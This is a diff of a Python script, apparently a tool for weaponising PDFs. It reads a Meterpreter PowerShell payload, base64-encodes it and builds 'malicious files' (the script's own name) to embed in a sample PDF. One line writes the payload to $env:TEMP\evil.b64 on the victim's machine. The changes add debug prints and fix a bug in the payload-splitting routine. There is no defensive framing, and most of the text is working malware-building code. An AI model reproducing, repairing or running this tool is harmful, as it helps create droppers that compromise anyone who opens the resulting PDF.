@@ -1,12 +1,14 @@
 import os
 import sys
 import pypdftk as scm
+import re
+import base64
 
 from PyPDF2 import PdfFileWriter, PdfFileReader
 
 payload = "meterpreter-64-take-6.ps1"
 output = "new.pdf"
-inp = "also.pdf"
+inp = "sample.pdf"
 
 def addJS():
 
@@ -48,17 +50,23 @@ def isBase64(payload, filename):
             isb64 = False
     else:
         isb64 = False
+    print(str(payload))
+    #base64.b64decode(payload)
+    #print(str(payload))
     return isb64
     
 # Create payload file to embed
 def create_putfile(payload, b64):
-    putfile = scm.split("\n")
+    print("before putfile")
+    putfile = payload.split("\n")
+    print("after putfile")
     if b64:
         payload = payload.decode()
         payload = payload.split('\n')
         payload = "".join(payload)
         putfile[6] = "Write-Output \"" + payload + "\" > $env:TEMP\\evil.b64 \n"
     else:
+        print("got here")
         payload = base64.b64encode(payload)
         payload = payload.decode()
         payload = payload.split('\n')
@@ -77,15 +85,16 @@ def create_powershell():
 
 
 def insertMaliciousFiles():
-    
+     
     raw_payload = ""
     # Read contents of payload file
     with open(payload, "rb") as pd:
         raw_payload = pd.read()
-    
+    print(raw_payload)
     #payload.close()
     # Check if payload is base64 encoded
     var = isBase64(raw_payload, payload)
+    print(str(var))
     # Create malicious files
     putFile = create_putfile(raw_payload, var)
     psFile = create_powershell()
